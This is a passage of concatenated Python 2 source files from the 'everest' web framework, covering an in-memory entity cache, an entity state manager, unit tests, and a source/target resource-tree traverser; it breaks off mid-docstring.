        if not entity.id is None:
            if entity.id in self.__id_map:
                if not self.__id_map[entity.id] is entity:
                    raise ValueError('Duplicate entity ID ""%s"".' % entity.id)
                else:
                    do_append = False
            else:
                self.__id_map[entity.id] = entity
        elif not self.__allow_none_id:
            raise ValueError('Entity ID must not be None.')
        # The slug can be a lazy attribute depending on the
        # value of other (possibly not yet initialized) attributes which is
        # why we can not always assume it is available at this point.
        if hasattr(entity, 'slug') and not entity.slug is None:
            if entity.slug in self.__slug_map:
                if not self.__slug_map[entity.slug] is entity:
                    raise ValueError('Duplicate entity slug ""%s"".'
                                     % entity.slug)
            else:
                self.__slug_map[entity.slug] = entity
        if do_append:
            self.__entities.append(entity)

    def remove(self, entity):
        """"""
        Removes the given entity from this cache.

        :param entity: Entity to remove.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises KeyError: If the given entity is not in this cache.
        :raises ValueError: If the ID of the given entity is `None`.
        """"""
        self.__id_map.pop(entity.id, None)
        self.__slug_map.pop(entity.slug, None)
        self.__entities.remove(entity)

    def replace(self, entity):
        """"""
        Replaces the current entity that has the same ID as the given new
        entity with the latter.

        :param entity: Entity to replace.
        :type entity: Object implementing :class:`everest.interfaces.IEntity`.
        :raises KeyError: If the given entity is not in this cache.
        :raises ValueError: If the ID of the given entity is `None`.
        """"""
        if entity.id is None:
            raise ValueError('Entity ID must not be None.')
        old_entity = self.__id_map[entity.id]
        self.remove(old_entity)
        self.add(entity)

    def get_all(self):
        """"""
        Returns the list of all entities in this cache in the order they
        were added.
        """"""
        return self.__entities

    def retrieve(self, filter_expression=None,
                 order_expression=None, slice_expression=None):
        """"""
        Retrieve entities from this cache, possibly after filtering, ordering
        and slicing.
        """"""
        ents = iter(self.__entities)
        if not filter_expression is None:
            ents = filter_expression(ents)
        if not order_expression is None:
            # Ordering always involves a copy and conversion to a list, so
            # we have to wrap in an iterator.
            ents = iter(order_expression(ents))
        if not slice_expression is None:
            ents = islice(ents, slice_expression.start, slice_expression.stop)
        return ents

    def __contains__(self, entity):
        if not entity.id is None:
            is_contained = entity.id in self.__id_map
        else:
            is_contained = entity in self.__entities
        return is_contained


class EntityCacheMap(object):
    """"""
    Map for entity caches.
    """"""
    def __init__(self):
        self.__cache_map = defaultdict(EntityCache)

    def __getitem__(self, entity_class):
        return self.__cache_map[entity_class]

    def get_by_id(self, entity_class, entity_id):
        cache = self.__cache_map[entity_class]
        return cache.get_by_id(entity_id)

    def get_by_slug(self, entity_class, slug):
        cache = self.__cache_map[entity_class]
        return cache.get_by_slug(slug)

    def add(self, entity_class, entity):
        cache = self.__cache_map[entity_class]
        cache.add(entity)

    def remove(self, entity_class, entity):
        cache = self.__cache_map[entity_class]
        cache.remove(entity)

    def update(self, entity_class, source_data, target_entity):
        EntityStateManager.set_state_data(entity_class,
                                          source_data, target_entity)

    def query(self, entity_class):
        return MemoryQuery(entity_class,
                           self.__cache_map[entity_class].get_all())

    def __contains__(self, entity):
        cache = self.__cache_map[type(entity)]
        return entity in cache

    def keys(self):
        return self.__cache_map.keys()
/n/n/neverest/repositories/state.py/n/n""""""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Mar 14, 2013.
""""""
from everest.entities.attributes import get_domain_class_attribute_iterator
from everest.entities.attributes import get_domain_class_attribute_names
from everest.utils import get_nested_attribute
from everest.utils import set_nested_attribute
from pyramid.compat import iteritems_
from weakref import ref

__docformat__ = 'reStructuredText en'
__all__ = ['ENTITY_STATES',
           'EntityStateManager',
           ]


class ENTITY_STATES(object):
    """"""
    Entity state flags.
    """"""
    CLEAN = 'CLEAN'
    NEW = 'NEW'
    DELETED = 'DELETED'
    DIRTY = 'DIRTY'


class EntityStateManager(object):
    """"""
    Manager for entity state and state data.

    Initially, an object is marked as NEW (freshly instantiated) or CLEAN
    (freshly fetched from repository).

    Only a weak reference to the tracked object is stored to avoid circular
    references.

    Not all state transitions are allowed.
    """"""
    # FIXME: Need a proper state diagram here or drop tracking alltogether.
    __allowed_transitions = set([(None, ENTITY_STATES.NEW),
                                 (None, ENTITY_STATES.CLEAN),
                                 (None, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.NEW, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.NEW, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.DELETED, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.DELETED, ENTITY_STATES.NEW),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.DIRTY),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.DELETED),
                                 (ENTITY_STATES.CLEAN, ENTITY_STATES.NEW),
                                 (ENTITY_STATES.DIRTY, ENTITY_STATES.CLEAN),
                                 (ENTITY_STATES.DIRTY, ENTITY_STATES.DELETED),
                                 ])

    def __init__(self, entity_class, entity, unit_of_work):
        self.__entity_class = entity_class
        self.__obj_ref = ref(entity)
        self.__uow_ref = ref(unit_of_work)
        self.__state = None
        self.__last_state = self.get_state_data(entity_class, entity)

    @classmethod
    def manage(cls, entity_class, entity, unit_of_work):
        """"""
        Manages the given entity under the given Unit Of Work.

        If `entity` is already managed by the given Unit Of Work, nothing
        is done.

        :raises ValueError: If the given entity is already under management
          by a different Unit Of Work.
        """"""
        if hasattr(entity, '__everest__'):
            if not unit_of_work is entity.__everest__.unit_of_work:
                raise ValueError('Trying to register an entity that has been '
                                 'registered with another session!')
        else:
            entity.__everest__ = cls(entity_class, entity, unit_of_work)

    @classmethod
    def release(cls, entity, unit_of_work):
        """"""
        Releases the given entity from management under the given Unit Of
        Work.

        :raises ValueError: If `entity` is not managed at all or is not
          managed by the given Unit Of Work.
        """"""
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to unregister an entity that has not '
                             'been registered yet!')
        elif not unit_of_work is entity.__everest__.unit_of_work:
            raise ValueError('Trying to unregister an entity that has been '
                             'registered with another session!')
        delattr(entity, '__everest__')

    @classmethod
    def set_state(cls, entity, state):
        """"""
        Sets the state flag of the given entity to the given value.

        :raises ValueError: If `entity` is not managed.
        """"""
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to mark an unregistered entity as '
                             '%s!' % state)
        entity.__everest__.state = state

    @classmethod
    def get_state(cls, entity):
        """"""
        Returns the state flag of the given entity.

        :raises ValueError: If `entity` is not managed.
        """"""
        if not hasattr(entity, '__everest__'):
            raise ValueError('Trying to get the state of an unregistered '
                             'entity!')
        return entity.__everest__.state

    @classmethod
    def transfer_state_data(cls, entity_class, source_entity, target_entity):
        """"""
        Transfers instance state data from the given source entity to the
        given target entity.
        """"""
        state = cls.get_state_data(entity_class, source_entity)
        cls.set_state_data(entity_class, state, target_entity)

    @classmethod
    def get_state_data(cls, entity_class, entity):
        """"""
        Returns state data for the given entity of the given class.

        :param entity: Entity to obtain the state data from.
        :returns: Dictionary mapping attributes to attribute values.
        """"""
        attrs = get_domain_class_attribute_iterator(entity_class)
        return dict([(attr,
                      get_nested_attribute(entity, attr.entity_attr))
                     for attr in attrs
                     if not attr.entity_attr is None])

    @classmethod
    def set_state_data(cls, entity_class, data, entity):
        """"""
        Sets the given state data on the given entity of the given class.

        :param data: State data to set.
        :type data: Dictionary mapping attributes to attribute values.
        :param entity: Entity to receive the state data.
        """"""
        attr_names = get_domain_class_attribute_names(entity_class)
        nested_items = []
        for attr, new_attr_value in iteritems_(data):
            if not attr.entity_attr in attr_names:
                raise ValueError('Can not set attribute ""%s"" for entity '
                                 '""%s"".' % (attr.entity_attr, entity_class))
            if '.' in attr.entity_attr:
                nested_items.append((attr, new_attr_value))
                continue
            else:
                setattr(entity, attr.entity_attr, new_attr_value)
        for attr, new_attr_value in nested_items:
            try:
                set_nested_attribute(entity, attr.entity_attr, new_attr_value)
            except AttributeError, exc:
                if not new_attr_value is None:
                    raise exc

    def __get_state(self):
        state = self.__state
        if state == ENTITY_STATES.CLEAN:
            if self.get_state_data(self.__entity_class, self.__obj_ref()) \
               != self.__last_state:
                state = ENTITY_STATES.DIRTY
        return state

    def __set_state(self, state):
        if not (self.__get_state(), state) in self.__allowed_transitions:
            raise ValueError('Invalid state transition %s -> %s.'
                             % (self.__state, state))
        self.__state = state
        if state == ENTITY_STATES.CLEAN:
            self.__last_state = self.get_state_data(self.__entity_class,
                                                    self.__obj_ref())

    #: The current state. One of the `ENTITY_STATES` constants.
    state = property(__get_state, __set_state)

    @property
    def unit_of_work(self):
        return self.__uow_ref()

/n/n/neverest/tests/test_memory_cache.py/n/n""""""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Apr 13, 2013.
""""""
from everest.entities.base import Entity
from everest.querying.interfaces import IFilterSpecificationFactory
from everest.querying.interfaces import IOrderSpecificationFactory
from everest.querying.specifications import FilterSpecificationFactory
from everest.querying.specifications import OrderSpecificationFactory
from everest.querying.specifications import asc
from everest.querying.specifications import eq
from everest.repositories.memory.cache import EntityCache
from everest.repositories.memory.querying import EvalFilterExpression
from everest.repositories.memory.querying import EvalOrderExpression
from everest.testing import Pep8CompliantTestCase
from pyramid.threadlocal import get_current_registry
from everest.repositories.memory.cache import EntityCacheMap

__docformat__ = 'reStructuredText en'
__all__ = ['EntityCacheTestCase',
           'EntityCacheMapTestCase',
           ]


class EntityCacheTestCase(Pep8CompliantTestCase):
    def set_up(self):
        Pep8CompliantTestCase.set_up(self)
        # Some tests require the filter and order specification factories.
        flt_spec_fac = FilterSpecificationFactory()
        ord_spec_fac = OrderSpecificationFactory()
        reg = get_current_registry()
        reg.registerUtility(flt_spec_fac, IFilterSpecificationFactory)
        reg.registerUtility(ord_spec_fac, IOrderSpecificationFactory)

    def test_basics(self):
        ent = MyEntity(id=0)
        cache = EntityCache(entities=[])
        cache.add(ent)
        self.assert_true(cache.get_by_id(ent.id) is ent)
        self.assert_true(cache.has_id(ent.id))
        self.assert_true(cache.get_by_slug(ent.slug) is ent)
        self.assert_true(cache.has_slug(ent.slug))
        self.assert_equal(len(cache.get_all()), 1)
        # Adding the same entity twices should not have any effect.
        cache.add(ent)
        self.assert_true(cache.get_by_id(ent.id) is ent)
        self.assert_equal(len(cache.get_all()), 1)
        #
        ent1 = MyEntity(id=0)
        txt = 'FROBNIC'
        ent1.text = txt
        cache.replace(ent1)
        self.assert_equal(cache.get_by_id(ent.id).text, txt)
        self.assert_equal(cache.get_all(), [ent])
        self.assert_equal(list(cache.retrieve()), [ent])
        cache.remove(ent)
        self.assert_is_none(cache.get_by_id(ent.id))
        self.assert_is_none(cache.get_by_slug(ent.slug))

    def test_filter_order_slice(self):
        ent0 = MyEntity(id=0)
        ent1 = MyEntity(id=1)
        ent2 = MyEntity(id=2)
        cache = EntityCache(entities=[])
        cache.add(ent0)
        cache.add(ent1)
        cache.add(ent2)
        filter_expr = EvalFilterExpression(~eq(id=0))
        order_expr = EvalOrderExpression(asc('id'))
        slice_expr = slice(1, 2)
        self.assert_equal(list(cache.retrieve(filter_expression=filter_expr,
                                              order_expression=order_expr,
                                              slice_expression=slice_expr)),
                          [ent2])

    def test_allow_none_id_false(self):
        ent = MyEntity()
        cache = EntityCache(entities=[], allow_none_id=False)
        self.assert_raises(ValueError, cache.add, ent)


class EntityCacheMapTestCase(Pep8CompliantTestCase):
    def test_basics(self):
        ecm = EntityCacheMap()
        ent = MyEntity(id=0)
        ecm.add(MyEntity, ent)
        self.assert_equal(ecm[MyEntity].get_by_id(0), ent)
        self.assert_true(ent in ecm)
        self.assert_equal(ecm.keys(), [MyEntity])
        ecm.remove(MyEntity, ent)
        self.assert_false(ent in ecm)


class MyEntity(Entity):
    text = None

/n/n/neverest/tests/test_traversalpath.py/n/n""""""
This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Oct 21, 2013.
""""""
from everest.testing import Pep8CompliantTestCase
from everest.traversalpath import TraversalPath

__docformat__ = 'reStructuredText en'
__all__ = ['TraversalPathTestCase',
           ]


class TraversalPathTestCase(Pep8CompliantTestCase):
    def test_basics(self):
        tp = TraversalPath()
        self.assert_equal(len(tp), 0)
        self.assert_is_none(tp.parent)
        self.assert_is_none(tp.relation_operation)
        parent = 'proxy'
        attr = 'attribute'
        key = ('source', 'target')
        rel_op = 'relation_operation'
        tp.push(parent, key, attr, rel_op)
        self.assert_equal(len(tp), 1)
        self.assert_true(key in tp)
        self.assert_equal(tp.parent, parent)
        self.assert_equal(tp.relation_operation, rel_op)
        tp.pop()
        self.assert_equal(len(tp), 0)
        self.assert_false(key in tp)
/n/n/neverest/traversal.py/n/n""""""
Custom resource object tree traverser.

This file is part of the everest project.
See LICENSE.txt for licensing, CONTRIBUTORS.txt for contributor information.

Created on Feb 4, 2011.
""""""
from collections import MutableSequence
from collections import MutableSet
from everest.attributes import get_attribute_cardinality
from everest.attributes import is_terminal_attribute
from everest.constants import CARDINALITY_CONSTANTS
from everest.constants import RELATION_OPERATIONS
from everest.constants import RESOURCE_ATTRIBUTE_KINDS
from everest.constants import RESOURCE_KINDS
from everest.interfaces import IDataTraversalProxyAdapter
from everest.interfaces import IDataTraversalProxyFactory
from everest.resources.interfaces import IResource
from everest.traversalpath import TraversalPath
from logging import getLogger as get_logger
from pyramid.compat import itervalues_
from pyramid.threadlocal import get_current_registry
from pyramid.traversal import ResourceTreeTraverser
from zope.interface import implementer # pylint: disable=E0611,F0401
#from everest.resources.staging import create_staging_collection

__docformat__ = 'reStructuredText en'
__all__ = ['ConvertingDataTraversalProxyMixin',
           'DataSequenceTraversalProxy',
           'DataTraversalProxy',
           'DataTraversalProxyAdapter',
           'DataTraversalProxyFactory',
           'SourceTargetDataTreeTraverser',
           'SuffixResourceTraverser',
           ]


class SuffixResourceTraverser(ResourceTreeTraverser):
    """"""
    A custom resource tree traverser that allows us to specify the
    representation for resources with a suffix as in
    `http://everest/myobjects.csv`.

    Rather than to reproduce the functionality of the `__call__` method, we
    check if base part of the current view name (`myobjects` in the example)
    can be retrieved as a child resource from the context. If yes, we set the
    context to the resource and the view name to the extension part of the
    current view name (`csv` in the example); if no, nothing is changed.
    """"""
    def __call__(self, request):
        system = ResourceTreeTraverser.__call__(self, request)
        context = system['context']
        view_name = system['view_name']
        if IResource.providedBy(context) and '.' in view_name: # pylint: disable=E1101
            rc_name, repr_name = view_name.split('.')
            try:
                child_rc = context[rc_name]
            except KeyError:
                pass
            else:
                if IResource.providedBy(child_rc): # pylint: disable=E1101
                    system['context'] = child_rc
                    system['view_name'] = repr_name
        return system


class DataSequenceTraversalProxy(object):
    """"""
    Simple wrapper for a sequence of data traversal proxies.
    """"""
    #: Constant indicating that this proxy is for collection resource data.
    proxy_for = RESOURCE_KINDS.COLLECTION

    def __init__(self, proxies):
        self.__proxies = proxies

    def __iter__(self):
        return iter(self.__proxies)


class DataTraversalProxy(object):
    """"""
    Abstract base class for data tree traversal proxies.

    By providing a uniform interface to the nodes of data trees
    encountered during tree traversal, this proxy makes it possible to use
    different data structures as source or target for the traversal.
    """"""
    #: Constant indicating that this proxy is for member resource data.
    proxy_for = RESOURCE_KINDS.MEMBER

    def __init__(self, data, accessor, relationship_direction):
        """"""
        :param data: root of the data tree to traverse.
        :param relationship_direction: constant indicating which relation
          direction(s) to consider for managing references.
        """"""
        super(DataTraversalProxy, self).__init__()
        self.relationship_direction = relationship_direction
        self._data = data
        self._accessor = accessor
        self._relationships = {}

    def get_relationship_attributes(self):
        """"""
        Returns an iterator over the relationship attributes (i.e.,
        non-terminal attributes) of the proxied data.

        :returns: iterator yielding objects implementing
          :class:`everest.resources.interfaces.IResourceAttribute`.
        """"""
        for attr in self._attribute_iterator():
            if not is_terminal_attribute(attr):
                yield attr

    def get_matching(self, source_id):
        """"""
        Returns a matching target object for the given source ID.
        """"""
        value = self._accessor.get_by_id(source_id)
        if not value is None:
            reg = get_current_registry()
            prx_fac = reg.getUtility(IDataTraversalProxyFactory)
            prx = prx_fac.make_proxy(value,
                                     self._accessor,
                                     self.relationship_direction)
        else:
            prx = None
        return prx

    @property
    def update_attribute_value_items(self):
        """"""
        Returns an iterator of items for an attribute value map to use for
        an UPDATE operation.

        The iterator ignores collection attributes as these are processed
        implicitly by the traversal algorithm.

        :returns: iterator yielding tuples with objects implementing
          :class:`everest.resources.interfaces.IResourceAttribute` as the
          first and the proxied attribute value as the second argument.
        """"""
        for attr in self._attribute_iterator():
            if attr.kind != RESOURCE_ATTRIBUTE_KINDS.COLLECTION:
                try:
                    attr_val = self._get_proxied_attribute_value(attr)
                except AttributeError:
                    continue
                else:
                    yield (attr, attr_val)

    def set_relationship(self, attribute, relationship):
        """"""
        Sets the given domain relationship object for the given resource
        attribute.
        """"""
        self._relationships[attribute.entity_attr] = relationship

    def get_relationship(self, attribute):
        """"""
        Returns the domain relationship object for the given resource
        attribute.
        """"""
        return self._relationships[attribute.entity_attr]

    def get_attribute_proxy(self, attribute):
        """"""
        Returns a traversal proxy (cardinality ONE) or an iterable sequence
        data traversal proxy (cardinality MANY) for the specified relation
        attribute value of the proxied data.

        :raises ValueError: If :param:`attribute` is a terminal attribute.
        """"""
        attr_val = self._get_relation_attribute_value(attribute)
        if attr_val is None:
            prx = None
        else:
            if not self._accessor is None:
                acc = self._make_accessor(attribute.attr_type)
            else:
                acc = None
            reg = get_current_registry()
            prx_fac = reg.getUtility(IDataTraversalProxyFactory)
            prx = prx_fac.make_proxy(attr_val, acc,
                                     self.relationship_direction,
                                     options=
                                        self._get_proxy_options(attribute))
        return prx

    def do_traverse(self):
        """"""
        Checks if this proxy should be traversed.
        """"""
        return True

    def _get_proxy_options(self, attribute): # pylint:disable=W0613
        """"""
        Returns custom constructor options to pass to new proxies constructed
        from this one through :method:`get_attribute_proxy`. This default
        implementation returns an emtpy dictionary.
        """"""
        return {}

    def _get_relatee(self, attribute):
        """"""
        Returns the relatee for the given relation attribute.

        :raises AttributeError: If no relatee for the given attribute has
          been set.
        """"""
        try:
            rel = self._relationships[attribute.entity_attr]
        except KeyError:
            raise AttributeError(attribute)
        else:
            return rel.relatee

    def get_id(self):
        """"""
        Returns the ID of the proxied data.

        :returns: Numeric or string ID.
        """"""
        raise NotImplementedError('Abstract method.')

    def _get_entity_type(self):
        """"""
        Returns the entity type of the proxied data.

        :returns: Type object (subclass of
          :class:`everest.entities.base.Entity`)
        """"""
        raise NotImplementedError('Abstract method.')

    def get_entity(self):
        """"""
        Returns the proxied data as a domain object.

        :returns: Instance of :class:`everest.entities.base.Entity`.
        """"""
        raise NotImplementedError('Abstract method.')

    def _attribute_iterator(self):
        """"""
        Returns an iterator over all proxied resource attributes.
        """"""
        raise NotImplementedError('Abstract method.')

    def _get_relation_attribute_value(self, attribute):
        """"""
        Returns the value for the given relation attribute from the proxied
        data. Depending on the implementation, a sequence of data items may
        be returned for attributes of cardinality MANY.
        """"""
        raise NotImplementedError('Abstract method.')

    def _get_proxied_attribute_value(self, attribute):
        """"""
        Returns the value for the given attribute from the proxied data.

        :raises AttributeError: If the proxied data do not have the specified
          attribute.
        """"""
        raise NotImplementedError('Abstract method.')

    def _make_accessor(self, value_type):
        """"""
        Creates a new target accessor for the given value.
        """"""
        raise NotImplementedError('Abstract method.')

    def __str__(self):
        return ""%s(id=%s)"" % (self._data.__class__.__name__, self.get_id())

    def __hash__(self):
        """"""
        The hash value is built either from the ID and the entity type of
        the proxied data or, if the ID is None, from the runtime object
        ID.
        """"""
        data_id = self.get_id()
        return data_id is None and id(self._data) \
               or hash((self._get_entity_type(), data_id))

    def __eq__(self, other):
        """"""
        Equality is determined by comparing hash values.
        """"""
        return self.__hash__() == hash(other)


@implementer(IDataTraversalProxyFactory)
class DataTraversalProxyFactory(object):
    """"""
    Factory for data traversal proxies.
    """"""
    def make_source_proxy(self, data, options=None):
        """"""
        Returns a data traversal proxy for the given source data.

        This is a convenience factory function to use when manually setting
        up a data traversal proxy for source data.

        :raises ValueError: If there is no adapter for the given traversal
          data and the data is not iterable.
        """"""
        return self.__make_proxy('make_source_proxy', data, (),
                                 dict(options=options))

    def make_target_proxy(self, data, accessor, manage_back_references=True,
                          options=None):
        """"""
        Returns a data traversal proxy for the given target data.

        This is a convenience factory function to use when manually setting
        up a data traversal proxy for target data.

        :raises ValueError: If there is no adapter for the given traversal
          data and the data is not iterable.
        """"""
        return self.__make_proxy('make_target_proxy', data, (accessor,),
                                 dict(manage_back_references=
                                            manage_back_references,
                                      options=options))

    def make_proxy(self, data, accessor, relationship_direction,
                   options=None):
        """"""
        Returns a data traversal proxy for the given data.

        This is the generic factory function that can be used to create
        both source and target data traversal proxies.

        :raises ValueError: If there is no adapter for the given traversal
          data and the data is not iterable.
        """"""
        return self.__make_proxy('make_proxy', data,
                                 (accessor, relationship_direction),
                                 dict(options=options))

    def __make_proxy(self, method_name, data, args, options):
        # We first check if we have a registered adapter for the given data;
        # if not, we assume it is a mutable sequence or set; if that fails,
        # we raise a ValueError.
        reg = get_current_registry()
        adp = reg.queryAdapter(data, IDataTraversalProxyAdapter)
        if not adp is None:
            prx = getattr(adp, method_name)(*args, **options)
        else:
            if not isinstance(data, (MutableSequence, MutableSet)):
                # Assuming an iterable is not enough here.
                raise ValueError('Invalid data type for traversal: %s.'
                                 % type(data))
            else:
                prxs = []
                for item in data:
                    adp = reg.queryAdapter(item, IDataTraversalProxyAdapter)
                    if adp is None:
                        raise ValueError('Invalid data type for traversal: '
                                         '%s.' % type(item))
                    prx = getattr(adp, method_name)(*args, **options)
                    prxs.append(prx)
                prx = DataSequenceTraversalProxy(prxs)
        return prx


@implementer(IDataTraversalProxyAdapter)
class DataTraversalProxyAdapter(object):
    """"""
    Abstract base class for data traversal proxy adapters.

    The adapters are used for dispatching a new data traversal proxy based
    on a resource data tree node's value.
    """"""
    #: The data traversal proxy class used by this factory.
    proxy_class = lambda *args: None

    def __init__(self, data):
        self._data = data

    def make_source_proxy(self, options=None):
        """"""
        Returns a data traversal proxy for the adapted data.
        """"""
        raise NotImplementedError('Abstract method.')

    def make_target_proxy(self, accessor, manage_back_references=True,
                          options=None):
        """"""
        Returns a data traversal proxy for the adapted data.
        """"""
        raise NotImplementedError('Abstract method.')

    def make_proxy(self, accessor, relationship_direction, options=None):
        """"""
        Returns a data traversal proxy for the adapted data.
        """"""
        if options is None:
            options = {}
        return self.proxy_class(self._data, accessor,
                                   relationship_direction, **options)


class ConvertingDataTraversalProxyMixin(object):
    """"""
    Mixin class for data traversal proxies that convert incoming
    representation data to an entity.
    """"""
    __converted_entity = None

    def get_entity(self):
        """"""
        Returns the entity converted from the proxied data.
        """"""
        if self._accessor is None:
            if self.__converted_entity is None:
                self.__converted_entity = self._convert_to_entity()
        else:
            # If we have an accessor, we can get the proxied entity by ID.
            # FIXME: This is a hack that is only used for REMOVE operations
            #        with data elements.
            self.__converted_entity = \
                self.get_matching(self.get_id()).get_entity()
        return self.__converted_entity

    def _convert_to_entity(self):
        raise NotImplementedError('Abstract method.')


class SourceTargetDataTreeTraverser(object):
    """"""
    Traverser for synchronous traversal of a source and a target data tree.

    For each data item pair, starting with the root of the source and target
    data tree, iterate over the non-terminal attributes of the associated type
    and obtain the attribute value (child data item) for both the source and
    the target. If the parent source or target data item is `None`, the
    corresponding child data item is also `None`.

    A child node is traversed along the ADD cascade when only the source
    was found, along the REMOVE cascade when only the target was found, and
    along the UPDATE cascade when both source and target were found. Traversal
    is suppressed when the parent attribute does not have the appropriate
    cascading flag set.

    When traversing along the ADD cascade, a child node of a node that is
    being added is only traversed (along the ADD cascade) when it has no ID
    (i.e., ID is None).

    When traversing along the REMOVE cascade, a child node of a node that is
    being removed is also removed if it has an ID (i.e., the ""id"" attribute
    is not None).
    """"""
    def __init__(self, source_proxy, target_proxy):
        self._src_prx = source_proxy
        self._tgt_prx = target_proxy
        self.__trv_path = TraversalPath()
        self.__root_is_sequence = \
            (not source_proxy is None and
             source_proxy.proxy_for == RESOURCE_KINDS.COLLECTION) \
            or (not target_proxy is None and
                target_proxy.proxy_for == RESOURCE_KINDS.COLLECTION)
        if __debug__:
            self.__logger = get_logger('everest')
        else:
            self.__logger = None

    @classmethod
    def make_traverser(cls, source_data, target_data, relation_operation,
                       accessor=None, manage_back_references=True,
                       source_proxy_options=None, target_proxy_options=None):
        """"""
        Factory method to create a tree traverser depending on the input
        source and target data combination.

        :param source_data: Source data.
        :param target_target: Target data.
        :param str relation_operation: Relation operation. On of the constants
          defined in :class:`everest.constants.RELATION_OPERATIONS`.
        :param accessor: Accessor for looking up target nodes for update
          operations.
        :param bool manage_back_references: Flag passed to the target proxy.
        """"""
        reg = get_current_registry()
        prx_fac = reg.getUtility(IDataTraversalProxyFactory)
        if relation_operation == RELATION_OPERATIONS.ADD \
           or relation_operation == RELATION_OPERATIONS.UPDATE:
            if relation_operation == RELATION_OPERATIONS.ADD \
               and not target_data is None:
                raise ValueError('Must not provide target data with '
                                 'relation operation ADD.')
            source_proxy = \
                    prx_fac.make_source_proxy(source_data,
                                              options=source_proxy_options)
            source_is_sequence = \
                source_proxy.proxy_for == RESOURCE_KINDS.COLLECTION
            if not source_is_sequence:
                source_id = source_proxy.get_id()
        else:
            source_proxy = None
            source_is_sequence = False
        if relation_operation == RELATION_OPERATIONS.REMOVE \
           or relation_operation == RELATION_OPERATIONS.UPDATE:
            if target_proxy_options is None:
                target_proxy_options = {}
            if relation_operation == RELATION_OPERATIONS.REMOVE:
                if not source_data is None:
                    raise ValueError('Must not provide source data with '
                                     'relation operation REMOVE.')
                target_proxy = prx_fac.make_target_proxy(
                                            target_data,
                                            accessor,
                                            manage_back_references=
                                                     manage_back_references,
                                            options=target_proxy_options)
            else: # UPDATE
                if accessor is None:
                    raise ValueError('Need to provide an accessor when '
                                     'performing UPDATE operations.')
                if not target_data is None:
                    target_root = target_data
                elif not source_is_sequence:
                    # Look up the (single) target to update.
                    target_root = accessor.get_by_id(source_id)
                    if target_root is None:
                        raise ValueError('Entity with ID %s to update not '
                                         'found.' % source_id)
                else:
                    # Look up collection of targets to update.
                    target_root = []
                    for src_prx in source_proxy:
                        tgt_ent_id = src_prx.get_id()
                        if tgt_ent_id is None:
                            continue
                        tgt_ent = accessor.get_by_id(tgt_ent_id)
                        if tgt_ent is None:
                            continue
                        target_root.append(tgt_ent)
                target_proxy = prx_fac.make_target_proxy(
                                            target_root,
                                            accessor,
                                            manage_back_references=
                                                 manage_back_references,
                                            options=target_proxy_options)
            target_is_sequence = \
                    target_proxy.proxy_for == RESOURCE_KINDS.COLLECTION
        else:
            target_proxy = None
            target_is_sequence = False
        if not source_proxy is None and not target_proxy is None:
            # Check for source/target consistency.
            if not ((source_is_sequence and target_is_sequence) or
                    (not source_is_sequence and not target_is_sequence)):
                raise ValueError('When both source and target root nodes are '
                                 'given, they can either both be sequences '
                                 'or both not be sequences.')
        return cls(source_proxy, target_proxy)

    def run(self, visitor):
        """"""
        :param visitor: visitor to call with every node in the domain tree.
        :type visitor: subclass of
            :class:`everest.entities.traversal.DomainVisitor`
        """"""
        if __debug__:
            self.__log_run(visitor)
        visitor.prepare()
        if self.__root_is_sequence:
            if not self._tgt_prx is None:
                tgts = iter(self._tgt_prx)
            else:
                tgts = None
            if not self._src_prx is None:
                srcs = iter(self._src_prx)
            else:
                srcs = None
            self.traverse_many(None, srcs, tgts, visitor)
        else:
            self.traverse_one(None, self._src_prx, self._tgt_prx, visitor)
        visitor.finalize()

    def traverse_one(self, attribute, source, target, visitor):
        """"""
        :param source: source data proxy
        :type source: instance of `DataTraversalProxy` or None
        :param target: target data proxy
        :type target: instance of `DataTraversalProxy` or None
        """"""
        if __debug__:
            self.__log_traverse_one(self.__trv_path, attribute, source, target)
        prx = source or target
        if prx.do_traverse():
            rel_op = RELATION_OPERATIONS.check(source, target)
            for attr in prx.get_relationship_attributes():
                # Check cascade settings.
                if not bool(attr.cascade & rel_op):
                    continue
                if not source is None:
                    attr_source = source.get_attribute_proxy(attr)
                else:
                    attr_source = None
                if not target is None:
                    attr_target = target.get_attribute_proxy(attr)
                else:
                    attr_target = None
                attr_rel_op = RELATION_OPERATIONS.check(attr_source,
                                                        attr_target)
                if attr_rel_op == RELATION_OPERATIONS.ADD:
                    if rel_op == RELATION_OPERATIONS.ADD:
                        parent = source
                    else:
                        parent = target
                elif attr_rel_op == RELATION_OPERATIONS.REMOVE:
                    parent = target
                else: # UPDATE
                    parent = target
                card = get_attribute_cardinality(attr)
                if card == CARDINALITY_CONSTANTS.ONE:
                    if attr_source is None and attr_target is None:
                        # If both source and target have None values, there is
                        # nothing to do.
                        continue
                    if attr_rel_op == RELATION_OPERATIONS.ADD:
#                        if not attr_source.get_id() is None:
#                            # We only ADD new items.
#                            continue
                        src_items = [attr_source]
                        tgt_items = None
                    elif attr_rel_op == RELATION_OPERATIONS.REMOVE:
                        src_items = None
                        tgt_items = [attr_target]
                    else: # UPDATE
                        src_items = [attr_source]
                        tgt_items = [attr_target]
                        src_id = attr_source.get_id()
                        tgt_id = attr_target.get_id()
                        if src_id != tgt_id:
                            src_target = attr_target.get_matching(src_id)
                            if not src_target is None:
                                tgt_items.append(src_target)
                else:
                    src_items = attr_source
                    tgt_items = attr_target
                self.__trv_path.push(parent, (source, target), attr, rel_op)
                self.traverse_many(attr, src_items, tgt_items, visitor)
                self.__trv_path.pop() # path.pop()
        visitor.visit(self.__trv_path, attribute, source, target)

    def traverse_many(self, attribute, source_sequence, target_sequence,
                      visitor):
        """"""
        Traverses the given source and target sequences and makes appropriate
        calls to :method:`traverse_one`.

        Algorithm:
        1) Build a map target item ID -> target data item from the target
           sequence;
        2) For each source data item in the source sequence check if it
           has a not-None ID; if yes, remove the corresponding target from the
           map generated in step 1) and use as target data item for the
           source data item; if no, use `None` as target data item;
        3) For the remaining items in the target map from 1), call
